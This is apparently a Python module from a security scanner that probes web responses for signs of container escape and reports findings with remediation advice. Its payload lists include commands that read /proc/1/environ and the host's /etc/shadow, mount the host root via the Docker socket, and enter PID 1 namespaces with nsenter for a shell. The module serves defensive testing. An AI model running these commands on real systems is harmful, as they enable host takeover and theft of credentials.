"""Container escape detection — identify misconfigurations that allow breakout."""

from __future__ import annotations

from basilisk.models import Finding
from basilisk.scoring import score_finding


CONTAINER_ESCAPE_INDICATORS = [
    {"pattern": "/proc/1/cgroup", "name": "cgroup mount", "description": "Access to /proc/1/cgroup reveals container environment."},
    {"pattern": "docker", "name": "Docker environment", "description": "Response contains Docker-specific strings."},
    {"pattern": "kubepods", "name": "Kubernetes pod", "description": "Response references Kubernetes pod identifiers."},
    {"pattern": "lxc", "name": "LXC container", "description": "Response references LXC container identifiers."},
]

ESCAPE_PAYLOADS = [
    "cat /proc/1/cgroup",
    "mount | grep -E 'docker|kubepods'",
    "ls -la /var/run/docker.sock",
    "ls -la /proc/1/root/",
    "cat /proc/1/mountinfo",
    "ls -la /host/",
    "cat /proc/1/environ",
    "ls -la /etc/kubernetes/",
    "cat /etc/hostname",
]

ESCAPE_COMMANDS = [
    {"command": "docker run -v /:/host alpine chroot /host", "risk": "Full host compromise via Docker socket"},
    {"command": "nsenter --target 1 --mount --uts --ipc --pid /bin/bash", "risk": "Namespace escape using nsenter"},
    {"command": "cat /proc/1/root/etc/shadow", "risk": "Host file system read via /proc"},
]

PRIVILEGED_CONTAINER_CHECKS = [
    "cat /proc/1/capability.h",
    "cat /proc/self/status | grep Cap",
    "ip link add dummy0 type dummy",
    "cat /sys/kernel/uevent_helper",
]


def detect_container_escape(
    response: dict, payload: str, target: str = ""
) -> Finding | None:
    body = response.get("body", "")
    lower_body = body.lower()

    for indicator in CONTAINER_ESCAPE_INDICATORS:
        if indicator["pattern"] in lower_body:
            cvss, vector = score_finding("container_escape")
            return Finding(
                vulnerability="Container Escape Possible",
                severity="Critical",
                description=(
                    f"Container escape indicator: {indicator['name']} — {indicator['description']} "
                    f"triggered by payload: {payload[:60]}"
                ),
                target=target,
                attack_type="container_escape",
                payload=payload,
                cvss_score=cvss,
                cvss_vector=vector,
                remediation="Run containers with minimal capabilities. Don't mount the Docker socket. Use Pod Security Policies.",
            )

    if "docker.sock" in lower_body or "var/run/docker" in lower_body:
        cvss, vector = score_finding("container_escape")
        return Finding(
            vulnerability="Docker Socket Accessible",
            severity="Critical",
            description="Docker socket (/var/run/docker.sock) is accessible. Full container escape possible.",
            target=target,
            attack_type="container_escape",
            payload=payload[:60],
            cvss_score=cvss,
            cvss_vector=vector,
            remediation="Do not mount Docker socket into containers. Use rootless Docker where possible.",
        )

    if "cap_effective" in lower_body or "cap_inheritable" in lower_body:
        cvss, vector = score_finding("container_escape")
        return Finding(
            vulnerability="Container Capability Leak",
            severity="High",
            description=f"Container capability information leaked in response via payload: {payload[:60]}",
            target=target,
            attack_type="container_escape",
            payload=payload[:60],
            cvss_score=cvss,
            cvss_vector=vector,
            confidence=0.5,
            remediation="Limit container capabilities. Drop all capabilities and add only required ones.",
        )

    return None


def get_payloads() -> list[str]:
    return list(ESCAPE_PAYLOADS)
